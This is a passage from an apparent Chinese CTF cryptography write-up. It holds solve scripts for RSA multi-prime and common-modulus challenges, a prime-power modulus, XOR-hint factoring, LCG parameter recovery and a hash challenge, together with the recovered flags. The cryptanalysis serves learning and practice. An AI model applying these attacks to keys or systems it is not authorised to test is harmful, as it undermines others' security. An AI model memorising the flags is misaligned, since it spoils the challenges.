<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">114107341297408283801468814470303963122122556489590451040619457052827864984505912502462030175984161431709841571908269123131659496812467145870607611968843929870716066046232009282431653653484798819370087696248364531531706249180822839879862098012984590503284615395588919199545142177727328844260380842155437987767067800740569616584597507776426572206990858918111272636507821551592564540694671795374831548677720629329358177802890287837056940407030212276399942462042866947423728888561392653713356355778914658317507319575084393752755452971007289968044006561357799908892371839922838486713582082980752194204224263283004373</span></span><br><span class="line">c = <span class="number">28535916699190273475273097091422420145718978597126134891571109006456944397344856577421369324831702083810238921719657496747722337086131545474384253288151783029981352196506749672783866527948391034258269669654392993063423671431837882584570973320095601407578443348352802850496429240170710269529489900871208384711844617081275862971410246759090936379744946527813691945129059991795202769186014306943707223831130752782380563227353615164053563120572722464543812139164048342504963081408349934180883607554389607335607410546630525512019818062185681153477671373000186961748278118124044645584490544698827467815360888525822167</span></span><br><span class="line">primes = [<span class="number">10436802938040427139</span>,<span class="number">12712357180113548549</span>,<span class="number">11502613740816749197</span>,<span class="number">10270880245559150279</span>,<span class="number">13498192768855092449</span>,<span class="number">17075632607344331131</span>,<span class="number">10100522426677320149</span>,<span class="number">10635881647150245973</span>,<span class="number">15622487550947237203</span>,<span class="number">11777892065426651999</span>,<span class="number">10040612110882504553</span>,<span class="number">13428970346605599557</span>,<span class="number">9261040693807289549</span>,<span class="number">16651625235320957803</span>,<span class="number">10126802520926958821</span>,<span class="number">14198042938738648387</span>,<span class="number">16946507762934111301</span>,<span class="number">9723861249937499279</span>,<span class="number">15774106340553595249</span>,<span class="number">16340211116882594287</span>,<span class="number">13618885037077024279</span>,<span class="number">9356350172425710359</span>,<span class="number">11718181938374860349</span>,<span class="number">16880270107514803247</span>,<span class="number">9281508366366115669</span>,<span class="number">15616762946597906161</span>,<span class="number">10986943768724409089</span>,<span class="number">17088379813205887661</span>,<span class="number">11964584391817142269</span>,<span class="number">14147604789494386003</span>,<span class="number">10621161426185076191</span>,<span class="number">10203735303764112277</span>]</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> primes:</span><br><span class="line">    phi *= i-<span class="number">1</span> </span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(<span class="number">65537</span>,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n1)</span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">21235204662158833223664424963408105101885570855652885953922511758363954474947609854216589644512813634294435585894296340005122907229365513346971631594453999584706013889403572150499529308966742992668850443386284277210686717652643585324255759216699733045642544284406720854291604837774882256435503827543483289606177965628162259184958789025311291796067574924595051311298594432767265114154138693108465671184854794167878031822162731921299518989845784744659944947091213703810190708463199067553747177712259911724424547999547534441790125049383068377243727588278432796727885216967953646999183906479537750330738956233695342750567</span></span><br><span class="line">e1 = <span class="number">13</span></span><br><span class="line">c1 = <span class="number">5640630966585093229374938575158853304507369792931959909038819773057666482368490365383634362421839045569190487785222799103423460816096797210546343809620912249021763787314569982909943181390882015170344954037813745251119237402775124991005154299085147091159741067430623420349690886728161235034687649593258746455165172528681627568611599473627285223154284756417744280966157271904828156564067870877521824545300153084830020169048653830385763172792698591998191641849931039720453035065355411394516308865955772746815765864888631258825704788352584540380169938419618543124830541663995097651872542381</span></span><br><span class="line">e2 = <span class="number">15</span></span><br><span class="line">c2 = <span class="number">5481001445755770090420425478456880914921441486935672376394423326451811448703288166341447356603281843336826624725965666634194700496514262129376916108926167953996689011980280761368893884042609095616407660087448963015169181749124738976578495911295096014725354350167650232970262765851074146687931181216305972147994236689422572940877763047930111954798962097847426932730342258169023809341164876019161104439561164839132092594444017039073155506935768658830659965630065643619399324102814118128802834719820426253836317043818687888302054465994498115387703382090351794495827905499417861507007863378916334790750453883661675063377</span></span><br><span class="line">s,x,y = gmpy2.gcdext(e1,e2)</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,x,n2)*<span class="built_in">pow</span>(c2,y,n2))%n2</span><br><span class="line">flag2 = <span class="built_in">bytes</span>.fromhex((<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;05929ec9778ed739d94ee1a77b742714&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="factorizing-n"><a href="#factorizing-n" class="headerlink" title="factorizing_n"></a>factorizing_n</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">226515252384227990547287743140613580056836242860947832749754689048997071950972581790210817523352001702907675581567498443649554801433663166425134375454937126656357069687274036935331269594383360450823787099121079436459236734336130768046337169817940540921822023269188752420603975467384377614321048859304185067329741055517464271746238143742661897809442359331215501438861121047081117632626097939097519866099140569819965948998542652908170134545593659233229897003698175558888336706474178958535138595687148003367152624421106553412886263257022809480187410133186189435436294593588009551451899398811758511878324326255293307347560753524372663257044426744744426759970254203341706284024734042826158828749144322843934985927079504722440497388146240627249465363931951790326885478025237643</span></span><br><span class="line">c = <span class="number">52409805591744226507807531465616894934028463651864630447934395956954575834603756391651746535033902964658694070544877880970130028487381287088425209448038533705903737694267359561133766799228825599943891152463160326583722749586721691729062524310148743637505134465210906856660867852927837112666513674858029892207902196213784902541173835447263733760225682942461048573387925463479672527491229113710629340960375692432470493054415657845868577650170648157402682163577152288432313996310562452677399267755695644659367792066311336521698894993982901657735586844358679888210537898629281625526455444811591386493005341435516094660429968084363084301878446471676122069724608083578102382181382107225473535696274374370868301830807644939881080301668756603163431000745972823980427048672732291</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure>

<p>n能分解成p的5次方</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">226515252384227990547287743140613580056836242860947832749754689048997071950972581790210817523352001702907675581567498443649554801433663166425134375454937126656357069687274036935331269594383360450823787099121079436459236734336130768046337169817940540921822023269188752420603975467384377614321048859304185067329741055517464271746238143742661897809442359331215501438861121047081117632626097939097519866099140569819965948998542652908170134545593659233229897003698175558888336706474178958535138595687148003367152624421106553412886263257022809480187410133186189435436294593588009551451899398811758511878324326255293307347560753524372663257044426744744426759970254203341706284024734042826158828749144322843934985927079504722440497388146240627249465363931951790326885478025237643</span></span><br><span class="line">c = <span class="number">52409805591744226507807531465616894934028463651864630447934395956954575834603756391651746535033902964658694070544877880970130028487381287088425209448038533705903737694267359561133766799228825599943891152463160326583722749586721691729062524310148743637505134465210906856660867852927837112666513674858029892207902196213784902541173835447263733760225682942461048573387925463479672527491229113710629340960375692432470493054415657845868577650170648157402682163577152288432313996310562452677399267755695644659367792066311336521698894993982901657735586844358679888210537898629281625526455444811591386493005341435516094660429968084363084301878446471676122069724608083578102382181382107225473535696274374370868301830807644939881080301668756603163431000745972823980427048672732291</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">11776588228599764849559519654482976956833367474471407292255776713760090338489966385328569279135095351660161277221351884258247731394014018172166064062551483</span></span><br><span class="line">phi = p**<span class="number">4</span> * (p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#flag&#123;1f95f530f85b940db810fc917607ee22&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">20810298530643139779725379335557687960281905096107101411585220918672653323875234344540342801651123667553812866458790076971583539529404583369246005781146655852295475940942005806084842620601383912513102861245275690036363402134681262533947475193408594967684453091957401932685922178406769578067946779033282889429596341714417295489842047781388337010440309434639274398589029236213499110100040841426995862849012466514170374143655264739023758914247116354182164550612494432327931655944868705959874670536031052370968354394583880324756639698871918124498442308334232127034553164826483441746719644515097123067550594588348951855987</span></span><br><span class="line">c = <span class="number">15294238831055894095745317706739204020319929545635634316996804750424242996533741450795483290384329104330090410419090776738963732127756947425265305276394058773237118310164375814515488333015347737716139073947021972607133348357843542310589577847859875065651579863803460777883480006078771792286205582765870786584904810922437581419555823588531402681156158991972023042592179567351862630979979989132957073962160946903567157184627177910380657091234027709595863061642453096671316307805667922247180282486325569430449985678954185611299166777141304330040782500340791721548519463552822293017606441987565074653579432972931432057376</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p⊕q = <span class="number">66138689143868607947630785415331461127626263390302506173955100963855136134289233949354345883327245336547595357625259526618623795152771487180400409991587378085305813144661971099363267511657121911410275002816755637490837422852032755234403225128695875574749525003296342076268760708900752562579555935703659615570</span></span><br></pre></td></tr></table></figure>

<p>剪枝，通过<code>p^q</code>的值和<code>n</code>求得p,q</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">sys.setrecursionlimit(<span class="number">3000</span>)</span><br><span class="line"></span><br><span class="line">gift = <span class="number">66138689143868607947630785415331461127626263390302506173955100963855136134289233949354345883327245336547595357625259526618623795152771487180400409991587378085305813144661971099363267511657121911410275002816755637490837422852032755234403225128695875574749525003296342076268760708900752562579555935703659615570</span></span><br><span class="line">N = <span class="number">20810298530643139779725379335557687960281905096107101411585220918672653323875234344540342801651123667553812866458790076971583539529404583369246005781146655852295475940942005806084842620601383912513102861245275690036363402134681262533947475193408594967684453091957401932685922178406769578067946779033282889429596341714417295489842047781388337010440309434639274398589029236213499110100040841426995862849012466514170374143655264739023758914247116354182164550612494432327931655944868705959874670536031052370968354394583880324756639698871918124498442308334232127034553164826483441746719644515097123067550594588348951855987</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findp</span>(<span class="params">p,q</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">1024</span>:</span><br><span class="line">        pp = <span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> N % pp == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;p = &quot;</span>,pp)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;q = &quot;</span>,N // pp)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        l = <span class="built_in">len</span>(p)</span><br><span class="line">        pp = <span class="built_in">int</span>(p,<span class="number">2</span>)</span><br><span class="line">        qq = <span class="built_in">int</span>(q,<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> (pp ^ qq) % (<span class="number">2</span> ** l) == gift %(<span class="number">2</span>**l) <span class="keyword">and</span> pp * qq %(<span class="number">2</span> ** l) == N % (<span class="number">2</span>**l):</span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span> + p,<span class="string">&#x27;1&#x27;</span> + q)</span><br><span class="line">            findp(<span class="string">&#x27;1&#x27;</span> + p,<span class="string">&#x27;0&#x27;</span> + q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span> + p,<span class="string">&#x27;1&#x27;</span> + q)</span><br><span class="line">            findp(<span class="string">&#x27;0&#x27;</span> + p,<span class="string">&#x27;0&#x27;</span> + q)</span><br><span class="line">            </span><br><span class="line">findp(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p =  <span class="number">121707024037268877853347577606022680727723421754483145354598542291389059730952536897407296725631390435306824149329251450428520017032068370905491236371588783551854860933656246846861645834009102275363106544337746297119821339365287420703692873394398852690091625453178968493127766149991473384937200789954598163517</span></span><br><span class="line">q =  <span class="number">170986832479534233007906048950464510414382588164533889416767650420928742690929190093999799507883047422413122991286355305384227808800633111611572663168246588357071419165779511128259447564377245832827901688451015954867004306626552500789867499455455629032408110167560346510245108938981288797349665759162752876911</span></span><br><span class="line">c = <span class="number">15294238831055894095745317706739204020319929545635634316996804750424242996533741450795483290384329104330090410419090776738963732127756947425265305276394058773237118310164375814515488333015347737716139073947021972607133348357843542310589577847859875065651579863803460777883480006078771792286205582765870786584904810922437581419555823588531402681156158991972023042592179567351862630979979989132957073962160946903567157184627177910380657091234027709595863061642453096671316307805667922247180282486325569430449985678954185611299166777141304330040782500340791721548519463552822293017606441987565074653579432972931432057376</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#flag&#123;7428fbd7-639b-11ee-b51b-64d69af3cb76&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">seed = randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">prng</span>:</span><br><span class="line">    n = p</span><br><span class="line">    a,b = [randint(<span class="number">2</span>, p - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        self.state = seed</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.state = (self.state * self.a + self.b) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    gen = prng(seed)</span><br><span class="line">    s = [seed]</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    s.append(gen.<span class="built_in">next</span>())</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    json.dump(s,f)</span><br><span class="line">    f.close()</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(gen.<span class="built_in">next</span>())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>LCG，已知<code>seed</code>,但是不知道<code>a</code>,<code>b</code>,<code>n</code></p>
<p>我的另外一篇博客总结了不少LCG的知识点：<a href="https://dexterjie.github.io/2023/07/05/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/#%E4%BE%8B%E9%A2%985-%E6%9C%AA%E7%9F%A5a-b-n%E6%B1%82seed%EF%BC%89">LCG | DexterJie’Blog</a></p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">output = [<span class="number">288530505749272642500730917886204398531</span>, <span class="number">63547143998110685331032679758907988154</span>, <span class="number">15151206512028268617888756820805603406</span>, <span class="number">268092204209244869520724955865278855216</span>, <span class="number">261067075335188593563542448889694952077</span>, <span class="number">138067838531633886698552659065694918861</span>, <span class="number">201319433320428898153580935653793106657</span>]</span><br><span class="line">t = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(output)):</span><br><span class="line">    t.append(output[i]-output[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">T = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(t)-<span class="number">1</span>):</span><br><span class="line">    T.append(t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>] - t[i]**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(T)-<span class="number">1</span>):</span><br><span class="line">    mm = gmpy2.gcd(T[i],T[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> isPrime(mm):</span><br><span class="line">        m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime(mm // i):</span><br><span class="line">                mm = mm // i</span><br><span class="line">                m.append(<span class="built_in">int</span>(mm))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        a = gmpy2.invert(t[<span class="number">0</span>],i) * t[<span class="number">1</span>] % i</span><br><span class="line">        b = output[<span class="number">1</span>] - a*output[<span class="number">0</span>] % i</span><br><span class="line">        a_ = gmpy2.invert(a,i)</span><br><span class="line"></span><br><span class="line">        seed = output[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;seed =&quot;</span>,seed)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            seed = (a * seed + b) % i</span><br><span class="line">        flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(seed)+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;302184756857257140159769321021979097116&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="hashes"><a href="#hashes" class="headerlink" title="hashes"></a>hashes</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">43</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag[<span class="number">0</span>:<span class="number">3</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha256(flag[<span class="number">3</span>:<span class="number">5</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha512(flag[<span class="number">5</span>:<span class="number">7</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha256(flag[<span class="number">7</span>:<span class="number">9</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha256(flag[<span class="number">9</span>:<span class="number">11</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha224(flag[<span class="number">11</span>:<span class="number">13</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha224(flag[<span class="number">13</span>:<span class="number">15</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha224(flag[<span class="number">15</span>:<span class="number">17</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha1(flag[<span class="number">17</span>:<span class="number">20</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha1(flag[<span class="number">20</span>:<span class="number">23</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha512(flag[<span class="number">23</span>:<span class="number">25</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha1(flag[<span class="number">25</span>:<span class="number">28</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha256(flag[<span class="number">28</span>:<span class="number">30</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag[<span class="number">30</span>:<span class="number">33</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha256(flag[<span class="number">33</span>:<span class="number">35</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha1(flag[<span class="number">35</span>:<span class="number">38</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.sha224(flag[<span class="number">38</span>:<span class="number">40</span>].encode()).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(flag[<span class="number">40</span>:<span class="number">43</span>].encode()).hexdigest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bba78e7d3d6ea696bfef6e87a26a6c03</span></span><br><span class="line"><span class="comment"># 894461aba3e5e2724278cfc40fa15dc1510b0cd56430fec9fc8a90d6d8ebe5f7</span></span><br><span class="line"><span class="comment"># 092ca0da5f25c595eae6cc725dc12ae75889a639d205733223cb9cfaeaa702a521971e57f768079b03d53c8f092bb2c597cc3adb4a98224a144c5d62461beb52</span></span><br><span class="line"><span class="comment"># 122c597083bd438b7f6d72af75d025948899647711b806bdd2cd82fa69713db3</span></span><br><span class="line"><span class="comment"># 153812ae5fea0b73a011bf28bd7cea93644437c3fe3260b7b2d7e1e2f9f46bde</span></span><br><span class="line"><span class="comment"># 24296a0d1555ad424b04dd5f6268c5613dae32cde8a469ca8c9065b9</span></span><br><span class="line"><span class="comment"># 15d46f8eae648f5945c4605b15e0507836ee1251b74de2e95bf9394d</span></span><br><span class="line"><span class="comment"># 9afdf5d1027172492a32833975a69a1e501e6f824d3e5a7121ad18af</span></span><br><span class="line"><span class="comment"># 2b7655eb53f6f92086e58da465c6733bd8d8a1a3</span></span><br><span class="line"><span class="comment"># a44fce0412ae28173cf036700c3f1cc8c7a279c6</span></span><br><span class="line"><span class="comment"># 7356ea99a4fa12c6a3ed8ecc1e78a7bb28cdc1208962848646cf34e0d836f420cf594606cde74bec1dc2efe511dff0dd07b558bd0c7d01a526de2e9c25d47a6f</span></span><br><span class="line"><span class="comment"># cc5c3fe6e7356a26a134cff5633349f597c40a9d</span></span><br><span class="line"><span class="comment"># 757d22f85733770bae59cc857dcfc369db29031459421b808377cf06bc9881ad</span></span><br><span class="line"><span class="comment"># a2c7bdf97e3c761c431f8891dcc39fa9</span></span><br><span class="line"><span class="comment"># 0606c0e8f78de4d7a78522a5ae2f7b70e31e669e6e2a16e11c393e4443069813</span></span><br><span class="line"><span class="comment"># cb6c6c7cc8189868e1feaae773f947908233cdcc</span></span><br><span class="line"><span class="comment"># 2cb5169af85bd3122276f8b0a731ed2ea30c8bef366bfafe76b5e7db</span></span><br><span class="line"><span class="comment"># d1de3eac41792a7f498dae8f439bf16d</span></span><br></pre></td></tr></table></figure>

<p>一堆hash，麻烦在写脚本</p>
<p>exp:</p>
